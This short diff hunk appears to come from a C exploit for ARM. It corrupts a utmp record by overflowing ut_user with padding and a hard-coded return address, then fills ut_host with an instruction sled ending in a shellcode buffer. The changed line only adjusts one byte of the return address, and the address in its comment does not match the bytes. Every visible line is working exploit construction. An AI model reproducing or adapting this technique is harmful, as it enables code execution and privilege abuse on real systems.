@@ -38,7 +38,7 @@ int main(int argc, char **argv) {
 	//Prepare the space...
 	ut->ut_type = USER_PROCESS;
 	memset(ut, 0x61, ut_size);
-	strcpy(ut->ut_user,"AAAAAAAAAAAAAAAAphantom\x3c\xf3\xff\x7eWXYZ"); //0x7e8c25a4
+	strcpy(ut->ut_user,"AAAAAAAAAAAAAAAAphantom\x9c\xf3\xff\x7eWXYZ"); //0x7e8c25a4
   // Build an ARM mode sled...
 	wmemset((wchar_t *)&ut->ut_host, 0xe1a01001, __UT_HOSTSIZE / sizeof(wchar_t));
     memcpy(&ut->ut_host[__UT_HOSTSIZE - sc_size], shellcode, sc_size);
